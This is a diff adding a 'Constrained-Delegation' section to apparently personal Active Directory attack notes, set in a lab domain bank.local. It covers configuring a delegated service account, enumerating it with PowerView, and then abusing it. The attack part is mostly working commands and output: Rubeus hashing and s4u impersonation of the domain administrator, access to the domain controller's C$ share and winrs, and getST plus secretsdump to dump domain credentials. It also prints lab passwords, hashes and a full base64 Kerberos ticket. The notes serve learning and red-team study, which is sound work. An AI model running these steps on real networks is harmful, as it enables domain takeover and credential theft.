@@ -7,6 +7,7 @@ This is my personal notes on learning Active Directory. Do check out this repo t
 * **[Weak GPO Permission](#abusing-gpo-permissions)**
 * **[Asrep-Roasting](#asrep-roasting)**
 * **[Unconstrained-Delegation](#unconstrained-delegation)**
+* **[Constrained-Delegation](#constrained-delegation)**
 
 ## Weak GPO Permissions
 
@@ -492,4 +493,296 @@ lsadump::dcsync /domain:bank.local /user:DC01$
 3. http://www.harmj0y.net/blog/redteaming/another-word-on-delegation/
 4. https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation
 5. https://www.guidepointsecurity.com/blog/delegating-like-a-boss-abusing-kerberos-delegation-in-active-directory/
+```
+
+## Constrained-Delegation
+
+### Setup
+
+1. Create a Domain Join Computer and go to Server Manager -> Tools -> Active Directory Users and Computers. Click on Users -> Right Click -> New -> User. We going to create one user name **"serviceuser"**
+
+![[Pasted image 20210812153441.png]]
+
+2. Complete all the details.
+
+![[Pasted image 20210812153555.png]]
+
+3. Go to View -> Enable Advanced Features.
+
+![[Pasted image 20210812153746.png]]
+
+4. Double Click on the serviceuser and go to **Attribute Editor**
+
+![[Pasted image 20210812153825.png]]
+
+5. Find **"servicePrincipalName"** and add the service name.
+
+![[Pasted image 20210812154014.png]]
+
+6. Click apply and OK. We will see a new tab Delegation **(Close and double click on serviceuser again if not show)** . Tick on **"Trust this user for delegation to specified services only"** and **"Use any authentication protocol"**
+
+![[Pasted image 20210812154351.png]]
+
+7. Then click Add. Then click on Users or Computers. Add our DC Computer or any computer that we want this **"serviceuser"** to delegate. Then click OK.
+
+![[Pasted image 20210812154639.png]]
+
+8. Choose services such as **(HTTP, HOST, CIFS)** . Use CTRL to choose multiples.
+
+![[Pasted image 20210812154825.png]]
+
+9. Click on Apply once finish.
+
+![[Pasted image 20210812154846.png]]
+
+### Detect
+
+**1. PowerView.ps1**
+
+```bash
+# Commands
+Get-DomainUser -TrustedToAuth
+Get-DomainUser -TrustedToAuth | select -ExpandProperty msds-allowedtodelegateto
+Get-DomainUser -TrustedToAuth | select -Exp msds-allowedtodelegateto
+
+# Output
+
+logoncount               : 0
+badpasswordtime          : 1/1/1601 8:00:00 AM
+distinguishedname        : CN=Service User,CN=Users,DC=bank,DC=local
+objectclass              : {top, person, organizationalPerson, user}
+displayname              : Service User
+userprincipalname        : serviceuser@bank.local
+name                     : Service User
+objectsid                : S-1-5-21-1107409599-3969185633-1580028286-1111
+samaccountname           : serviceuser
+codepage                 : 0
+samaccounttype           : USER_OBJECT
+accountexpires           : NEVER
+countrycode              : 0
+whenchanged              : 8/12/2021 7:48:58 AM
+instancetype             : 4
+usncreated               : 32793
+objectguid               : f591b816-c313-43ad-83ea-53030138e363
+sn                       : User
+lastlogoff               : 1/1/1601 8:00:00 AM
+msds-allowedtodelegateto : {http/DC01.bank.local/bank.local, http/DC01.bank.local, http/DC01,
+                           http/DC01.bank.local/BANK...}
+objectcategory           : CN=Person,CN=Schema,CN=Configuration,DC=bank,DC=local
+dscorepropagationdata    : 1/1/1601 12:00:00 AM
+serviceprincipalname     : BANK/mssql
+givenname                : Service
+lastlogon                : 1/1/1601 8:00:00 AM
+badpwdcount              : 0
+cn                       : Service User
+useraccountcontrol       : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, TRUSTED_TO_AUTH_FOR_DELEGATION
+whencreated              : 8/12/2021 7:36:09 AM
+primarygroupid           : 513
+pwdlastset               : 8/12/2021 3:36:09 PM
+usnchanged               : 32816
+
+# Commands (adsisearcher)
+([adsisearcher]"(&(samAccountType=805306368)(msds-allowedtodelegateto=*))").FindAll().Properties
+
+# Output
+Name                           Value
+----                           -----
+givenname                      {Service}
+codepage                       {0}
+objectcategory                 {CN=Person,CN=Schema,CN=Configuration,DC=bank,DC=local}
+dscorepropagationdata          {1/1/1601 12:00:00 AM}
+usnchanged                     {32816}
+instancetype                   {4}
+logoncount                     {0}
+name                           {Service User}
+badpasswordtime                {0}
+pwdlastset                     {132732273695770019}
+serviceprincipalname           {BANK/mssql}
+objectclass                    {top, person, organizationalPerson, user}
+badpwdcount                    {0}
+samaccounttype                 {805306368}
+usncreated                     {32793}
+sn                             {User}
+objectguid                     {22 184 145 245 19 195 173 67 131 234 83 3 1 56 227 99}
+whencreated                    {8/12/2021 7:36:09 AM}
+adspath                        {LDAP://CN=Service User,CN=Users,DC=bank,DC=local}
+useraccountcontrol             {16843264}
+cn                             {Service User}
+countrycode                    {0}
+primarygroupid                 {513}
+whenchanged                    {8/12/2021 7:48:58 AM}
+msds-allowedtodelegateto       {http/DC01.bank.local/bank.local, http/DC01.bank.local, http/DC01, http/DC01.bank.loc...
+lastlogon                      {0}
+distinguishedname              {CN=Service User,CN=Users,DC=bank,DC=local}
+samaccountname                 {serviceuser}
+objectsid                      {1 5 0 0 0 0 0 5 21 0 0 0 191 186 1 66 97 247 148 236 126 81 45 94 87 4 0 0}
+lastlogoff                     {0}
+displayname                    {Service User}
+accountexpires                 {9223372036854775807}
+userprincipalname              {serviceuser@bank.local}
+```
+
+![[Pasted image 20210812155831.png]]
+
+![[Pasted image 20210812155856.png]]
+
+![[Pasted image 20210812160050.png]]
+
+### Attack
+
+**1. Knowing Plaintext/NTLM**
+
+*Story : We get a low privillege user with knowing the Plaintext/NTLM of the serviceuser.*
+
+- Generate from Plaintext to NTLM using **Rubeus.exe**
+
+```bash
+# Command
+.\Rubeus.exe hash /user:serviceuser /domain:BANK /password:'Passw0rd@123!'
+
+# Output
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.0.0
+
+
+[*] Action: Calculate Password Hash(es)
+
+[*] Input password             : Passw0rd@123!
+[*] Input username             : serviceuser
+[*] Input domain               : BANK
+[*] Salt                       : BANKserviceuser
+[*]       rc4_hmac             : 577BA934CE4EC1598BF4851AA85E465F
+[*]       aes128_cts_hmac_sha1 : D3C206F0505524956B96943C9E8CDC84
+[*]       aes256_cts_hmac_sha1 : 2E9C58D91EA51602E626D315ED3986A041D316F30449E5E6E6F6E65C38379D20
+[*]       des_cbc_md5          : A8B93E8694C77FAE
+```
+
+![[Pasted image 20210812160640.png]]
+
+- Use **Rubeus.exe** to perform s4u delegation and request TGT for user that we want to impersonate. 
+
+```bash
+# Commands
+.\Rubeus.exe s4u /user:serviceuser /rc4:577BA934CE4EC1598BF4851AA85E465F /impersonateuser:administrator /msdsspn:"cifs/DC01" /altservice:cifs,http,host /ptt
+```
+
+- Use **klist** to view current session ticket. **(Use klist purge to remove all)**
+
+```bash
+# Commands
+klist
+klist purge
+```
+
+![[Pasted image 20210812162220.png]]
+
+- We can try list **DC01** with this command now.
+
+```bash
+# Command
+ls \\dc01\c$
+```
+
+![[Pasted image 20210812162307.png]]
+
+- We can try **winrs** but take notes that it only work once. So everytime we want to run winrs, we need to re run the Rubeus again and request TGT.
+
+```bash
+# Command
+winrs -r:DC01 whoami
+```
+
+![[Pasted image 20210812162541.png]]
+
+- We can also try to mount C$ of DC01 to another drive in our machine.
+
+```bash
+# Command
+net use Z: \\dc01\c$
+```
+
+![[Pasted image 20210812162821.png]]
+
+- We can also try to use **getST** to get the impersonate user ccache file. Then use it to perform dcsync.
+
+```bash
+# Command
+getST.py -spn cifs/DC01.BANK.LOCAL 'BANK.LOCAL/serviceuser:Passw0rd@123!' -impersonate Administrator -dc-ip 192.168.125.136
+export KRB5CCNAME=Administrator.ccache
+secretsdump.py -k DC01.bank.local -just-dc
+```
+
+![[Pasted image 20210812164956.png]]
+
+- Take notes to add **"DC01.bank.local"** and **"bank.local"** in /etc/hosts
+
+![[Pasted image 20210811235232.png]]
+
+
+**2. Has session without knowing Plaintext/NTLM**
+
+*Story : We get shell on serviceuser without knowing the Plaintext/NTLM of the user.*
+
+- Download Rubeus.exe and use this command to request TGT of the current user.
+
+```bash
+# Command
+.\Rubeus.exe tgtdeleg /nowrap
+
+# Output
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.0.0
+
+
+[*] Action: Request Fake Delegation TGT (current user)
+
+[*] No target SPN specified, attempting to build 'cifs/dc.domain.com'
+[*] Initializing Kerberos GSS-API w/ fake delegation for target 'cifs/DC01.bank.local'
+[+] Kerberos GSS-API initialization success!
+[+] Delegation requset success! AP-REQ delegation ticket is now in GSS-API output.
+[*] Found the AP-REQ delegation ticket in the GSS-API output.
+[*] Authenticator etype: aes256_cts_hmac_sha1
+[*] Extracted the service ticket session key from the ticket cache: 4ks0IWvIk0MLZrnSKLEmA+36Bzd8Vxpqb8mQCzhYFV4=
+[+] Successfully decrypted the authenticator
+[*] base64(ticket.kirbi):
+
+      doIFHDCCBRigAwIBBaEDAgEWooIEJDCCBCBhggQcMIIEGKADAgEFoQwbCkJBTksuTE9DQUyiHzAdoAMCAQKhFjAUGwZrcmJ0Z3QbCkJBTksuTE9DQUyjggPgMIID3KADAgESoQMCAQKiggPOBIIDynxkLrleGuNwtXwlF/PYhe8WOFcxkt/Oe26p5pRThHknzUxzLjKCCAz/g4eeRlE0tKjImlEPNDuIOocI03DkdU0jOVoAS5okb2uBqEIIKJzPBQiFJEaRr1kqxbTT0+O3/8dHmaZZk6mQwTTs7YRg7axdq450MPMxXuZJ3ERrHNtcVHe+Xx076bCazi3yvRQgzXVn6YkkUDQgn4k2MbVJyXk3FmXDeyoPpE3XtYN/pjrZgw4yL3HS181joPfK89I9fa3n3R46eXvN9FXEs+5IawnkL66YVfYkjGm/kLxQO2OQE3dUKjVMXhEdkHZVqHuRLzNYdOWd3TfQc5DejGhz20R0Rrp7m088pE64rNnq80OR+wHBjHHK0N/QOAFPmxv8U1ZkarwresTXFDeOi3VAB35It881QkrV8ziLsj6EdPrgF/+qKOhXWbqzc2Khm+bkiq8ATJ+W9UydGvFWCN8Uy6gihEcGzYlb+GfO0C8ZpGBypIQkgFIDVQvsebmU6pPrgnHqnPJN7kiJkCDqnbeg6aMTarLnDX2mz8/mX4wLt3TTxPmb0mE7f5DAy0Lszhg8rdYnX70wt9nn4prPBv4mwXtC8sSkrJCvwSDOQVOKl+rVFeM+Tr+qb8UWd8yEr64ub2W46lGXHJsrD9LqIIRrhgZTw0cO6QijLz+VBurbqjDwkbkxpD8eFDNzpLpat+LW+dOy82ggyQT5sk1TmMMYwA9MNMVMjKVjvifx6jqWWZ4a0jwLl2FLKEXry+iflSqo3xSMfIdAfjZrJ5lxT4B0pRH3D/mnmGQp5fDPGkUipbet/A8d3wjtsVc/6KYWo7cep8072h6fuLMY6mq7ioB4qmKsjEuge44jMSGAYOFRQ6s+9nBACmHQm3WI59kcKVzRHeU8CkbbvO1G9kMzNUcb4b5hxThdaaQuwshj9erjOCMEr0iuM2clojdA/zobxdOribE6e+Jc1V3lGgBv8uWPYwGgiXo1MfaTscNfseWkGHKnoL+iOR/OWfF26gEGVeYCM210xXUqD7qJdaptri+dy9saUUTc3K3otdfxgX7y1EjbPRrJGZg+IJFcW6GeNxaY3jwItH+doH+ofV/KY0SIaXRYYv5bJjhfWD7jfOFauQ6LAWurKROalmG4k/tuy71tTvPoCxirJSROQLmmFpDQHdKUWMrRSh751K1T6qn0BqBmeOiRe7nfQO3dA6/KADUJq1qYjGV4RtuG3DbBybyVgWHueqFgsO8TJxPB1h5fKzR32G7gsR3hasb/6dozSPyUwUy5PkmiCwpuokWjgeMwgeCgAwIBAKKB2ASB1X2B0jCBz6CBzDCByTCBxqArMCmgAwIBEqEiBCAcu/sYSNMjndnV4/66z3/2UCMoEUIXGdyd+z7YfEcbUqEMGwpCQU5LLkxPQ0FMohgwFqADAgEBoQ8wDRsLc2VydmljZXVzZXKjBwMFAGChAAClERgPMjAyMTA4MTIwODMxMzBaphEYDzIwMjEwODEyMTgzMTMwWqcRGA8yMDIxMDgxOTA4MzEzMFqoDBsKQkFOSy5MT0NBTKkfMB2gAwIBAqEWMBQbBmtyYnRndBsKQkFOSy5MT0NBTA==
+```
+
+- Then use **Rubues.exe** again to perform s4u delegation and request TGT for user that we want to impersonate. 
+
+```bash
+# Command
+.\Rubeus.exe s4u /user:serviceuser /ticket:<base64-blob> /impersonateuser:administrator /msdsspn:"cifs/DC01" /altservice:cifs,http,host /ptt
+```
+
+![[Pasted image 20210812163800.png]]
+
+- Then we can try the same thing like the first scenario. For example we can try list **DC01** with this command now.
+
+```bash
+# Command
+ls \\DC01\c$
+```
+
+![[Pasted image 20210812163943.png]]
+
+### References
+
+```bash
+1. https://github.com/aniqfakhrul/archives#constrained-delegation
+2. https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/
+3. https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#kerberos-constrained-delegation
 ```
